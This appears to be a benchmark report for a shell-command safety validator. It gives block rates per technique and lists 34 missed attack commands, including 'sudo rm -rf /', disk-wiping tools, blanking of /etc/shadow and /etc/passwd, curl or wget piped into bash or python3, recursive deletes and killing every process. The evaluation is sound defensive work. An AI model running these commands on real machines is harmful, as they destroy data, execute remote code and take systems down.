# Validator benchmark (structural layer, adversarial_v3.jsonl)

Generated 2026-10-08T12:09:44+00:00 with sagecli 0.1.0, Python 3.12.3 on Linux-6.8.0-101-generic-x86_64-with-glibc2.39.

Flagged = verdict WARN or BLOCK. Blocked = verdict BLOCK. Headline metrics are the two BLOCKED rows.

| Metric | Value |
| --- | --- |
| **Attacks blocked** | 28/62 (45.2%) |
| Attacks flagged | 28/62 (45.2%) |
| **Benign blocked** | 0/47 (0.0%) |
| Benign flagged | 0/47 (0.0%) |

## Per technique (attacks)

| Technique | Blocked | Flagged |
| --- | --- | --- |
| critical_file_other | 1/6 (17%) | 1/6 (17%) |
| device_overwrite_other | 5/5 (100%) | 5/5 (100%) |
| find_other | 0/3 (0%) | 0/3 (0%) |
| fs_tools_other | 3/6 (50%) | 3/6 (50%) |
| interpreter_other | 0/4 (0%) | 0/4 (0%) |
| kill_other | 0/3 (0%) | 0/3 (0%) |
| move_to_void | 0/2 (0%) | 0/2 (0%) |
| perm_other | 2/3 (67%) | 2/3 (67%) |
| power_other | 2/7 (29%) | 2/7 (29%) |
| remote_code_other | 0/6 (0%) | 0/6 (0%) |
| rm_after_cd | 2/2 (100%) | 2/2 (100%) |
| rm_other_system_dirs | 6/6 (100%) | 6/6 (100%) |
| rm_root_spelling | 7/7 (100%) | 7/7 (100%) |
| rm_via_sudo | 0/2 (0%) | 0/2 (0%) |

## Attacks not blocked (34)

| ID | Technique | Verdict | Command |
| --- | --- | --- | --- |
| v3-0014 | rm_via_sudo | SAFE | `sudo rm -rf /` |
| v3-0015 | rm_via_sudo | SAFE | `sudo rm -rf /etc` |
| v3-0026 | fs_tools_other | SAFE | `parted -s /dev/sda mklabel gpt` |
| v3-0027 | fs_tools_other | SAFE | `sgdisk --zap-all /dev/sda` |
| v3-0028 | fs_tools_other | SAFE | `blkdiscard /dev/nvme0n1` |
| v3-0030 | critical_file_other | SAFE | `cp /dev/null /etc/shadow` |
| v3-0031 | critical_file_other | SAFE | `sed -i d /etc/passwd` |
| v3-0032 | critical_file_other | SAFE | `tee /etc/passwd < /dev/null` |
| v3-0033 | critical_file_other | SAFE | `rm -f /etc/shadow` |
| v3-0034 | critical_file_other | SAFE | `> /etc/fstab` |
| v3-0035 | move_to_void | SAFE | `mv /* /dev/null` |
| v3-0036 | move_to_void | SAFE | `mv ~ /dev/null` |
| v3-0039 | perm_other | SAFE | `chown -R nobody /home` |
| v3-0040 | remote_code_other | SAFE | `wget -qO- http://x.example/a \| sudo bash` |
| v3-0041 | remote_code_other | SAFE | `curl -s http://x.example/s \| python3` |
| v3-0042 | remote_code_other | SAFE | `curl -s http://x.example/s \| perl` |
| v3-0043 | remote_code_other | SAFE | `source <(curl -s http://x.example/s)` |
| v3-0044 | remote_code_other | SAFE | `. <(wget -qO- http://x.example/s)` |
| v3-0045 | remote_code_other | SAFE | `bash -c "$(curl -fsSL http://x.example/s)"` |
| v3-0046 | interpreter_other | SAFE | `python3 -c "import shutil; shutil.rmtree('/home')"` |
| v3-0047 | interpreter_other | SAFE | `python3 -c "import os; os.system('rm -rf ~')"` |
| v3-0048 | interpreter_other | SAFE | `node -e "require('fs').rmSync('/', {recursive: true})"` |
| v3-0049 | interpreter_other | SAFE | `perl -e 'unlink glob("/etc/*")'` |
| v3-0050 | find_other | SAFE | `find /home -type f -exec shred {} +` |
| v3-0051 | find_other | SAFE | `find / -xdev -type f -delete` |
| v3-0052 | find_other | SAFE | `find ~ -type f -exec rm {} \;` |
| v3-0055 | power_other | SAFE | `halt` |
| v3-0056 | power_other | SAFE | `shutdown -h now` |
| v3-0057 | power_other | SAFE | `shutdown -r +0` |
| v3-0058 | power_other | SAFE | `telinit 0` |
| v3-0059 | power_other | SAFE | `systemctl reboot` |
| v3-0060 | kill_other | SAFE | `kill -KILL -1` |
| v3-0061 | kill_other | SAFE | `killall5 -9` |
| v3-0062 | kill_other | SAFE | `pkill -9 -f .` |

## Benign rows flagged (0)

None.
